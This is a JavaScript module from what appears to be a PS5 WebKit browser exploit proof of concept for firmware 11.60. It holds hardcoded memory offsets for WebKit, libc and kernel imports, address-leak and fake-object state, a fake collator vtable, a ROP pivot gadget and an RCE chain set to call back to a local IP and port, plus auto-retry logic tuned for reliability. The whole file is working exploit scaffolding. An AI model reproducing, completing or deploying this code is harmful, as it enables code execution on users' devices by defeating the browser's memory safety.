(function () {
    "use strict";
    if (window._ds) return;

    // ── Parameter parsing ────────────────────────────────────────────────────
    const Q = window.EXPLOIT_PARAMS || new URLSearchParams(location.search);

    function intParam(name, fallback, lo, hi) {
        const raw = parseInt(Q.get(name) ?? "", 10);
        return Number.isFinite(raw) ? Math.max(lo, Math.min(hi, raw)) : fallback;
    }

    function hexParam(name, fallback) {
        const v = Q.get(name);
        if (!v) return fallback;
        const raw = parseInt(v, 16);
        return Number.isFinite(raw) && raw > 0 ? raw : fallback;
    }

    function hexListParam(name, fallback) {
        const v = Q.get(name);
        if (!v) return fallback;
        const out = [];
        for (const part of v.split(",")) {
            const raw = parseInt(part, 16);
            if (Number.isFinite(raw) && raw > 0) out.push(raw);
        }
        return out.length ? out : fallback;
    }

    // ── Per-firmware offsets (defaults = 11.60 hardware-verified) ─────────
    const P_HOST_CTOR_LIST = hexListParam("hc", [0x1e0d8, 0x1e320, 0x1f368]);
    const P_NOTIFY = hexParam("notify", 0x4740);
    const P_GADGET = hexParam("gd", 0x1d11a);
    const P_GETPID_SLOT = hexParam("gps", 0x34f57b8);
    const P_GETPID_EXP = hexParam("gpe", 0x1b280);
    const P_CLOSE_SLOT = hexParam("cls", 0x34f57a8);
    const P_CLOSE_EXP = hexParam("cle", 0x26e70);
    const P_ERROR_SLOT = hexParam("ers", 0x34f57b0);
    const P_ERROR_EXP = hexParam("ere", 0xf340);

    // ── Mode flags ───────────────────────────────────────────────────────────
    const PROBE_MODE = Q.get("probe") === "1";
    const SCAN_MODE = Q.get("scan") !== "0";
    const PC_BEACON = Q.get("pc") === "1";
    const BEACON_MODE = Q.get("log") === "1";
    var drainCountInit = intParam("n", 512, 64, 1024);

    // ── FW label ─────────────────────────────────────────────────────────────
    const FW_LABEL = (function () {
        const p = Q.get("fw");
        if (p) return p;
        const ua = (typeof navigator !== "undefined" && navigator.userAgent)
            ? navigator.userAgent : "";
        const m = /PlayStation 5\/(\d+\.\d+)/.exec(ua);
        return m ? m[1] : "??.??";
    })();

    // ── Constants ────────────────────────────────────────────────────────────
    var c = Object.freeze({
        REVISION: "renderer-notify-auto-proof-2",
        AUTO_RETRY_DELAY_MS: intParam("rd", 50, 0, 60000),
        MAX_ATTEMPTS: intParam("max", 0, 0, 1000000),
        SCREEN_LINES: intParam("lines", 14, 0, 400),
        K: 2,
        DUPLICATE_INDEX: 2,
        CONTROL_INDEX: 0xffff,
        CONTROL_INT: -64000,
        FILLER_BIGINTS: 1,         // K - 1
        FILLER_OBJECTS: 0xfffe - 2, // 0xfffe - K
        EXPECTED_LENGTH: 0x50001,
        CELL_BYTES: 0x30,
        FUNCTION_BYTES: 0x20,
        NATIVE_EXECUTABLE_BYTES: 0x38,
        HOLDER_BYTES: 0x40,
        ARENA_VIEW_BYTES: 0x30,
        COLLATOR_BYTES: 0x38,
        BOUND_COMPARE_BYTES: 0x20,
        PARSEINT_NATIVE_OFFSET: 0x1ea18,
        WEBKIT_TEXT_SIZE: 0x2c7c000,
        WEBKIT_RELRO_START: 0x32d8000,
        WEBKIT_RELRO_END: 0x34f7e48,
        IMPORT_WINDOW_A_OFFSET: 0x34f5708,
        IMPORT_WINDOW_A_BYTES: 0xd0,
        IMPORT_WINDOW_B_OFFSET: 0x34f5860,
        IMPORT_WINDOW_B_BYTES: 0x38,
        REQUIREMENTS_OBJECT_A_SLOT: 0x00,
        REQUIREMENTS_OBJECT_A_OFFSET: 0x29f350,
        REQUIREMENTS_OBJECT_B_SLOT: 0x08,
        REQUIREMENTS_OBJECT_B_OFFSET: 0x29f348,
        KERNEL_OBJECT_SLOT: 0x10,
        KERNEL_OBJECT_OFFSET: 0x6d1d0,
        CXA_FINALIZE_SLOT: 0x40,
        CXA_FINALIZE_OFFSET: 0x173e0,
        STRLEN_SLOT: 0x70,
        STRLEN_OFFSET: 0x44c0,
        CLOSE_SLOT: 0xa0,
        CLOSE_OFFSET: 0x26e70,
        ERROR_SLOT: 0xa8,
        ERROR_OFFSET: 0xf340,
        GETPID_SLOT: 0xb0,
        GETPID_OFFSET: 0x1b280,
        STRERROR_SLOT: 0xc8,
        STRERROR_OFFSET: 0x77070,
        PTHREAD_GETSPECIFIC_SLOT: 0x00,
        PTHREAD_GETSPECIFIC_OFFSET: 0x40dd0,
        MEMCHR_SLOT: 0x30,
        MEMCHR_OFFSET: 0x3c40,
        LIBC_TEXT_SIZE: 0x128000,
        KERNEL_TEXT_SIZE: 0x44000,
        NATURAL_TRAMPOLINE_OFFSET: P_GADGET,
        NOTIFY_OFFSET: P_NOTIFY,
        NOTIFICATION_REQUEST_SIZE: 0xc30,
        NOTIFICATION_MESSAGE_OFFSET: 0x2d,
        NOTIFICATION_MESSAGE: "PS5 OK",
        ARENA_BYTES: 0x2000,
        FAKE_UCOLLATOR_OFFSET: 0x100,
        FAKE_VTABLE_OFFSET: 0x300,
        RCE_CHAIN_OFFSET: 0x500,
        RCE_SOCKADDR_OFFSET: 0xC00,
        RCE_NOTIFY_PATH_OFFSET: 0xC20,
        RCE_NOTIFY_BUF_OFFSET: 0x1000,
        RCE_SAFE_W_OFFSET: 0x1F80,
        RCE_PC_IP: [192, 168, 1, 180],
        RCE_PORT: 50000,
        RCE_PIVOT_TRAMPOLINE_RVA: 0x1cb93,
        CARRIER_SLOTS: 9000000,
        CARRIER_BYTES: 9000000 * 8,
        CAPTURE_DELAY_MS: intParam("cap", 50, 0, 60000),
        COMPOSE_DELAY_MS: intParam("cap", 50, 0, 60000) + intParam("gap", 50, 0, 60000),
        DRAIN_SIZE: 0x10000,
        SLAB_SIZE: 0x400000,
        BUTTERFLY_HOLE_SIZE: 0x81000,
        SEPARATOR_SIZE: 0x10000,
        EARLY_HOLE_SIZE: 0x70000,
        GUARD_SIZE: 0x90000,
        PREDECESSOR_SIZE: 0x80000,
        FINAL_HOLE_SIZE: 0x80000,
        // Per-FW offset inputs
        P_HOST_CTOR_LIST: P_HOST_CTOR_LIST,
        P_NOTIFY: P_NOTIFY,
        P_GADGET: P_GADGET,
        P_GETPID_SLOT: P_GETPID_SLOT,
        P_GETPID_EXP: P_GETPID_EXP,
        P_CLOSE_SLOT: P_CLOSE_SLOT,
        P_CLOSE_EXP: P_CLOSE_EXP,
        P_ERROR_SLOT: P_ERROR_SLOT,
        P_ERROR_EXP: P_ERROR_EXP,
        // Mode flags
        PROBE_MODE: PROBE_MODE,
        SCAN_MODE: SCAN_MODE,
        PC_BEACON: PC_BEACON,
        BEACON_MODE: BEACON_MODE,
        FW_LABEL: FW_LABEL,
    });

    // ── Scratch buffers ──────────────────────────────────────────────────────
    var scratchBits = new ArrayBuffer(8);
    var buf = {
        rwHeader: new Uint8Array(c.CELL_BYTES),
        targetHeader: new Uint8Array(c.NATIVE_EXECUTABLE_BYTES),
        holderHeader: new Uint8Array(c.HOLDER_BYTES),
        arenaViewHeader: new Uint8Array(c.ARENA_VIEW_BYTES),
        collatorHeader: new Uint8Array(c.COLLATOR_BYTES),
        compareFnHeader: new Uint8Array(c.BOUND_COMPARE_BYTES),
        collatorOriginal: new Uint8Array(c.COLLATOR_BYTES - 0x18),
        importWindowA1: new Uint8Array(c.IMPORT_WINDOW_A_BYTES),
        importWindowA2: new Uint8Array(c.IMPORT_WINDOW_A_BYTES),
        importWindowB1: new Uint8Array(c.IMPORT_WINDOW_B_BYTES),
        importWindowB2: new Uint8Array(c.IMPORT_WINDOW_B_BYTES),
        scratchBits: scratchBits,
        scratchBytes: new Uint8Array(scratchBits),
        scratchWords: new Uint32Array(scratchBits),
        scratchDouble: new Float64Array(scratchBits),
        scanChunk: new Uint8Array(0x100),
    };

    // ── Mutable state ────────────────────────────────────────────────────────
    var navigationID = Date.now().toString(36);
    var autoMode = Q.get("auto") !== "0";
    var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
    var armed = Q.get("go") === "1";
    var attemptKey = c.REVISION + ":attempts";
    var passKey = c.REVISION + ":passed";
    var blockKey = c.REVISION + ":blocked";

    var priorAttempts = 0;
    var alreadyPassed = false;
    var alreadyBlocked = false;
    try {
        priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
        if (!Number.isFinite(priorAttempts) || priorAttempts < 0) priorAttempts = 0;
        alreadyPassed = sessionStorage.getItem(passKey) === "1";
        alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
    } catch (e) { }

    var s = {
        drainCount: drainCountInit,
        HOST_CONSTRUCTOR_OFFSET: P_HOST_CTOR_LIST[0],
        navigationID: navigationID,
        autoMode: autoMode,
        allowAgain: allowAgain,
        armed: armed,
        attemptKey: attemptKey,
        passKey: passKey,
        blockKey: blockKey,
        priorAttempts: priorAttempts,
        alreadyPassed: alreadyPassed,
        alreadyBlocked: alreadyBlocked,
        attemptNumber: priorAttempts + 1,
        seq: 0,
        keepIndex: 0,
        stopped: false,
        keepAlive: null,
        screenLines: [],
        symbolToString: Symbol.prototype.toString,
        // Object references
        referenceTarget: null,
        rwBuffer: null, rwView: null, rwMirror: null,
        targetBuffer: null, targetView: null,
        nativeTarget: parseInt,
        fakeHost: null, lengthWord: null,
        arenaBuffer: null, arenaView: null,
        realCollator: null, compareFn: null,
        notificationRequest: "",
        notificationRequestOK: false,
        notificationPrewarmResult: 0,
        targetHolder: null,
        holderGuardA: null, holderGuardB: null,
        fillerGraph: null, outerGraph: null,
        // Addrof state
        leakedScope: null, getterCarrier: null,
        preparedSymbolObject: null,
        capturedString: null, capturedWords: null,
        copiedLength: 0, captureState: 0, captureError: null,
        hostAddress: NaN, fakeAddress: NaN,
        // Predecessor state
        predecessorWords: null,
        pointerLow: 0, pointerHigh: 0,
        // Composition state
        targetAddress: NaN,
        targetAddressLow: 0, targetAddressHigh: 0,
        nativeTargetAddress: NaN,
        arenaViewAddress: NaN,
        realCollatorAddress: NaN,
        compareFnAddress: NaN,
        rwOriginalVector: NaN,
        rwHeaderOK: false,
        functionHeaderOK: false,
        nativeExecutableHeaderOK: false,
        functionStructureID: 0,
        nativeExecutableStructureID: 0,
        executableAddress: NaN,
        nativeFunctionAddress: NaN,
        nativeConstructorAddress: NaN,
        webkitBase: NaN, webkitBaseOK: false,
        pointersRepeated: false,
        restoreObserved: false,
        retrySafe: false,
        retryScheduled: false,
        attemptPersisted: false,
        candidateEverReturned: false,
        candidateMutationStarted: false,
        zeroHeaderMiss: false,
        gotReadAttempted: false,
        gotWindowAddressesOK: false,
        gotWindowsRepeated: false,
        gotCanonicalOK: false,
        gotReadOK: false,
        // Import resolution
        requirementsObjectA: 0, requirementsObjectB: 0,
        requirementsBase: NaN, requirementsBaseOK: false,
        kernelObjectPointer: 0, kernelObjectBase: NaN, kernelObjectBaseOK: false,
        cxaFinalizePointer: 0, strlenPointer: 0,
        strerrorPointer: 0, memchrPointer: 0,
        closePointer: 0, errorPointer: 0,
        getpidPointer: 0, pthreadGetspecificPointer: 0,
        cxaFinalizeStatus: 0, strlenStatus: 0,
        strerrorStatus: 0, memchrStatus: 0,
        closeStatus: 0, errorStatus: 0,
        getpidStatus: 0, pthreadGetspecificStatus: 0,
        libcBase: NaN, libcResolvedCount: 0, libcBaseOK: false,
        kernelBase: NaN, kernelResolvedCount: 0, kernelBaseOK: false,
        // Arena + commit state
        holderHeaderOK: false,
        arenaViewHeaderOK: false,
        collatorHeaderOK: false,
        compareFnHeaderOK: false,
        arenaBacking: NaN,
        arenaBackingRepeated: false,
        fakeUCollatorAddress: NaN,
        fakeVtableAddress: NaN,
        naturalTrampolineAddress: NaN,
        notifyEntryAddress: NaN,
        notifyAddressOK: false,
        arenaLayoutOK: false,
        arenaFilledOK: false,
        carrierArmedForCommit: false,
        notifyReady: false,
        commitStarted: false,
        commitBlockConfirmed: false,
        compositionState: 0,
        compositionLength: 0,
        compositionError: null,
        // Scan results
        deepslopScan: null,
        rwSID: 0,
        rwVectorTouched: false,
    };

    // ── Logging infrastructure ───────────────────────────────────────────────
    var _logQueue = [];
    var _logFlushPending = false;

    function _flushLogs() {
        _logFlushPending = false;
        if (typeof window.addLog !== "function") return;
        var batch = _logQueue.splice(0);
        for (var i = 0; i < batch.length; i++) window.addLog(batch[i]);
    }

    function screenLine(text) {
        s.screenLines.push(text.length > 110 ? text.slice(0, 107) + "..." : text);
        if (s.screenLines.length > c.SCREEN_LINES)
            s.screenLines.splice(0, s.screenLines.length - c.SCREEN_LINES);
        try {
            document.getElementById("scr").textContent = s.screenLines.join("\n");
        } catch (e) { }
        _logQueue.push(text);
        if (!_logFlushPending) {
            _logFlushPending = true;
            if (typeof requestAnimationFrame === "function")
                requestAnimationFrame(_flushLogs);
            else
                setTimeout(_flushLogs, 0);
        }
    }

    function showStatus(text, cls) {
        try {
            var node = document.getElementById("status");
            node.textContent = text;
            node.className = cls;
        } catch (e) { }
        try {
            if (typeof window.addExploitStatus === "function") window.addExploitStatus(text, cls);
            else if (window.parent && window.parent !== window)
                window.parent.postMessage({ type: "status", text: text, cls: cls }, "*");
        } catch (e) { }
    }

    function setCaption(text) {
        try { document.getElementById("cap").textContent = text; } catch (e) { }
    }

    function catState(cls) {
        try { document.getElementById("cat").className = cls; } catch (e) { }
    }

    function mark(tag, extra) {
        s.seq++;
        var line = "[" + String(s.attemptNumber).padStart(3, "0") + "] " + tag
            + (extra !== undefined ? " " + extra : "");
        screenLine(line);
        if (c.BEACON_MODE) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "log/" + encodeURIComponent(line), false);
                xhr.send();
            } catch (e) { }
        }
    }

    function hex(value) {
        return "0x" + value.toString(16);
    }

    // ── Reliability: adaptive drain count ────────────────────────────────────
    function adaptiveDrain(attempt) {
        if (attempt <= 2) return Math.min(384, s.drainCount);
        if (attempt <= 5) return 512;
        return Math.min(768, 512 + (attempt - 5) * 32);
    }

    // ── Reliability: retry backoff ───────────────────────────────────────────
    function retryDelay(attempt) {
        if (attempt <= 3) return c.AUTO_RETRY_DELAY_MS;
        if (attempt <= 8) return 200;
        if (attempt <= 20) return 500;
        return 1000;
    }

    function failed() {
        mark("AUTO-RETRY-AFTER-FAILURE", "attempt=" + s.attemptNumber);
        s.stopped = false;
        s.retryScheduled = false;
        catState("run");
        setCaption("PoC PS5 FW " + c.FW_LABEL);
        showStatus("retrying  (attempt " + (s.attemptNumber + 1) + ")", "run");
        var delay = retryDelay(s.attemptNumber);
        setTimeout(function () {
            try { history.replaceState(null, ""); } catch (e) { }
            s.attemptNumber++;
            s.drainCount = adaptiveDrain(s.attemptNumber);
            if (typeof _ds.startAttempt === "function") _ds.startAttempt();
        }, delay);
    }

    function succeeded(detail) {
        s.stopped = true;
        catState("ok");
        setCaption("PoC PS5 FW " + c.FW_LABEL + " - NOTIFICATION SENT");
        showStatus("SUCCESS  (attempt " + s.attemptNumber + ")", "ok");
        screenLine("");
        screenLine("*** SUCCESS *** " + detail);
    }

    // ── Per-attempt state reset (fresh objects every attempt) ────────────────
    function resetAttemptState() {
        s.referenceTarget = null;
        s.rwBuffer = null; s.rwView = null; s.rwMirror = null;
        s.targetBuffer = null; s.targetView = null;
        s.fakeHost = null; s.lengthWord = null;
        s.arenaBuffer = null; s.arenaView = null;
        s.realCollator = null; s.compareFn = null;
        s.notificationRequest = "";
        s.notificationRequestOK = false;
        s.notificationPrewarmResult = 0;
        s.targetHolder = null;
        s.holderGuardA = null; s.holderGuardB = null;
        s.fillerGraph = null; s.outerGraph = null;
        s.leakedScope = null; s.getterCarrier = null;
        s.preparedSymbolObject = null;
        s.capturedString = null; s.capturedWords = null;
        s.copiedLength = 0; s.captureState = 0; s.captureError = null;
        s.hostAddress = NaN; s.fakeAddress = NaN;
        s.predecessorWords = null;
        s.pointerLow = 0; s.pointerHigh = 0;
        s.targetAddress = NaN;
        s.targetAddressLow = 0; s.targetAddressHigh = 0;
        s.nativeTargetAddress = NaN;
        s.arenaViewAddress = NaN;
        s.realCollatorAddress = NaN;
        s.compareFnAddress = NaN;
        s.rwOriginalVector = NaN;
        s.rwHeaderOK = false;
        s.functionHeaderOK = false;
        s.nativeExecutableHeaderOK = false;
        s.functionStructureID = 0;
        s.nativeExecutableStructureID = 0;
        s.executableAddress = NaN;
        s.nativeFunctionAddress = NaN;
        s.nativeConstructorAddress = NaN;
        s.webkitBase = NaN; s.webkitBaseOK = false;
        s.pointersRepeated = false;
        s.restoreObserved = false;
        s.retrySafe = false;
        s.retryScheduled = false;
        s.candidateEverReturned = false;
        s.candidateMutationStarted = false;
        s.zeroHeaderMiss = false;
        s.gotReadAttempted = false;
        s.gotWindowAddressesOK = false;
        s.gotWindowsRepeated = false;
        s.gotCanonicalOK = false;
        s.gotReadOK = false;
        s.requirementsObjectA = 0; s.requirementsObjectB = 0;
        s.requirementsBase = NaN; s.requirementsBaseOK = false;
        s.kernelObjectPointer = 0; s.kernelObjectBase = NaN; s.kernelObjectBaseOK = false;
        s.cxaFinalizePointer = 0; s.strlenPointer = 0;
        s.strerrorPointer = 0; s.memchrPointer = 0;
        s.closePointer = 0; s.errorPointer = 0;
        s.getpidPointer = 0; s.pthreadGetspecificPointer = 0;
        s.cxaFinalizeStatus = 0; s.strlenStatus = 0;
        s.strerrorStatus = 0; s.memchrStatus = 0;
        s.closeStatus = 0; s.errorStatus = 0;
        s.getpidStatus = 0; s.pthreadGetspecificStatus = 0;
        s.libcBase = NaN; s.libcResolvedCount = 0; s.libcBaseOK = false;
        s.kernelBase = NaN; s.kernelResolvedCount = 0; s.kernelBaseOK = false;
        s.holderHeaderOK = false;
        s.arenaViewHeaderOK = false;
        s.collatorHeaderOK = false;
        s.compareFnHeaderOK = false;
        s.arenaBacking = NaN;
        s.arenaBackingRepeated = false;
        s.fakeUCollatorAddress = NaN;
        s.fakeVtableAddress = NaN;
        s.naturalTrampolineAddress = NaN;
        s.notifyEntryAddress = NaN;
        s.notifyAddressOK = false;
        s.arenaLayoutOK = false;
        s.arenaFilledOK = false;
        s.carrierArmedForCommit = false;
        s.notifyReady = false;
        s.commitStarted = false;
        s.commitBlockConfirmed = false;
        s.compositionState = 0;
        s.compositionLength = 0;
        s.compositionError = null;
        s.deepslopScan = null;
        s.keepAlive = new Array(s.drainCount + 3);
        s.keepIndex = 0;
        buf.rwHeader.fill(0);
        buf.targetHeader.fill(0);
        buf.holderHeader.fill(0);
        buf.arenaViewHeader.fill(0);
        buf.collatorHeader.fill(0);
        buf.compareFnHeader.fill(0);
        buf.collatorOriginal.fill(0);
        buf.importWindowA1.fill(0);
        buf.importWindowA2.fill(0);
        buf.importWindowB1.fill(0);
        buf.importWindowB2.fill(0);
    }

    // ── Retry machinery (safe retries without re-triggering the bug) ─────────
    function scheduleSafeRetry(reason) {
        if (s.retryScheduled || s.stopped) return;
        var candidateStateSafe = !s.candidateEverReturned
            || (s.zeroHeaderMiss && !s.candidateMutationStarted);
        if (!s.autoMode || !s.retrySafe || !candidateStateSafe
            || s.candidateMutationStarted || s.commitStarted
            || s.carrierArmedForCommit || s.alreadyBlocked || !s.attemptPersisted) {
            mark("AUTO-RETRY-NOT-SCHEDULED", "reason=" + reason
                + "-auto=" + s.autoMode + "-safe=" + s.retrySafe
                + "-candidate-seen=" + s.candidateEverReturned
                + "-candidate-mutated=" + s.candidateMutationStarted
                + "-candidate-state-safe=" + candidateStateSafe
                + "-commit=" + s.commitStarted + "-armed=" + s.carrierArmedForCommit
                + "-preblocked=" + s.alreadyBlocked
                + "-attempt-persisted=" + s.attemptPersisted);
            failed();
            return;
        }
        if (c.MAX_ATTEMPTS && s.attemptNumber >= c.MAX_ATTEMPTS) {
            mark("ATTEMPT-CEILING", "reason=" + reason + "-max=" + c.MAX_ATTEMPTS);
            failed();
            return;
        }
        s.retryScheduled = true;
        var nextAttempt = s.attemptNumber + 1;
        mark("AUTO-RETRY-SCHEDULED", "reason=" + reason
            + "-next-attempt=" + nextAttempt + "-delay-ms=" + c.AUTO_RETRY_DELAY_MS);
        setTimeout(function () {
            var storageStillSafe = false;
            var candidateStillSafe = !s.candidateEverReturned
                || (s.zeroHeaderMiss && !s.candidateMutationStarted);
            try {
                storageStillSafe = sessionStorage.getItem(s.passKey) === null
                    && sessionStorage.getItem(s.blockKey) === null;
            } catch (e) { }
            if (!storageStillSafe || !s.retrySafe || !candidateStillSafe
                || s.candidateMutationStarted || s.commitStarted
                || s.carrierArmedForCommit || s.stopped) {
                mark("AUTO-RETRY-CANCELLED", "reason=" + reason
                    + "-storage-safe=" + storageStillSafe
                    + "-retry-safe=" + s.retrySafe
                    + "-candidate-safe=" + candidateStillSafe
                    + "-candidate-mutated=" + s.candidateMutationStarted
                    + "-commit=" + s.commitStarted
                    + "-armed=" + s.carrierArmedForCommit);
                failed();
                return;
            }
            s.attemptNumber = nextAttempt;
            startAttempt();
        }, c.AUTO_RETRY_DELAY_MS);
    }

    function finishEarlySafeAttempt(tag, extra, reason) {
        s.retrySafe = true;
        mark(tag, extra + "-retry-safe=true-candidate-seen=false"
            + "-candidate-mutated=false");
        scheduleSafeRetry(reason);
    }

    // ── Attempt entry point (wired to the modular chain) ─────────────────────
    function startAttempt() {
        if (s.stopped) return;
        resetAttemptState();
        showStatus("RUNNING  attempt " + s.attemptNumber, "run");
        try {
            sessionStorage.setItem(s.attemptKey, String(s.attemptNumber));
            s.attemptPersisted = sessionStorage.getItem(s.attemptKey)
                === String(s.attemptNumber);
        } catch (e) { }
        mark("ATTEMPT-START", "attempt-persisted=" + s.attemptPersisted
            + "-auto=" + s.autoMode + "-hard-max=" + (c.MAX_ATTEMPTS || "none")
            + "-capture-ms=" + c.CAPTURE_DELAY_MS + "-compose-ms=" + c.COMPOSE_DELAY_MS
            + "-retry-ms=" + c.AUTO_RETRY_DELAY_MS);
        try {
            _ds.buildAndStoreGraph();
            _ds.prepareAddrof();
        } catch (error) {
            finishEarlySafeAttempt("SETUP-THREW",
                (error && error.name) + ":" + String(error && error.message).slice(0, 80),
                "setup-threw");
        }
    }

    setCaption("PoC PS5 FW " + c.FW_LABEL);

    // ── Export namespace ─────────────────────────────────────────────────────
    var _ds = {
        c: c,
        s: s,
        buf: buf,
        mark: mark,
        hex: hex,
        screenLine: screenLine,
        showStatus: showStatus,
        setCaption: setCaption,
        catState: catState,
        failed: failed,
        succeeded: succeeded,
        adaptiveDrain: adaptiveDrain,
        retryDelay: retryDelay,
        resetAttemptState: resetAttemptState,
        scheduleSafeRetry: scheduleSafeRetry,
        finishEarlySafeAttempt: finishEarlySafeAttempt,
        // Attempt entry point (called by ds-main.js + failed())
        startAttempt: startAttempt,
        // Slots for modules to register their entry points
        beginComposition: null,
        runGroomAndLoad: null,
    };

    window._ds = _ds;
})();
